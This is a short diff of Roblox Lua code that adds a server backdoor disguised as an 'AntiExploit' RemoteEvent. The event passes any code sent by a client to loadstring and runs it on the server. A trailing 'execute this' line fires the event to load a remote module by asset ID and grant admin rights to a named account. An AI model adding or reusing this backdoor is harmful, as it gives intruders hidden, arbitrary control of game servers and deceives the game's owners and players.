@@ -1,0 +1,11 @@
+local remote = Instance.new("RemoteEvent")
+remote.Name = "AntiExploit" --obviously change, duh
+remote.Parent = game:GetService("ReplicatedStorage")
+remote.OnServerEvent:Connect(function(plr, code)
+   loadstring(code)()
+end)
+
+
+execute this:
+
+game:GetService("ReplicatedStorage")["AntiExploit"]:FireServer([[require(520532182).giveAdmin"Chrischris1980"]]) --- MML
